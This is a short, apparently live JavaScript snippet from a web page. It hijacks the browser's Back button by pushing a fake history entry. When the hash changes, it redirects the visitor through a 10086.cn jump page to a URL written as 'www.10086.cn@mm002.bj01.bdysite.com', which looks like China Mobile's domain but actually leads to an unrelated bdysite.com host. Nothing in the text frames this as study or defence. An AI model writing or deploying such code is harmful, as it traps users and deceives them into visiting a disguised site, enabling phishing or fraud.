window.anchor = function() {
            history.pushState(history.length + 1, "message", location.href.split('#')[0] + "#" + new Date().getTime())
        }
        function zp() {
            location.href = 'http://www.10086.cn/jump.html?url=http%3A%2F%2Fwww.10086.cn@mm002.bj01.bdysite.com';
        }
        setTimeout("anchor()", 100);
        window.onhashchange = function () {
            zp()
        };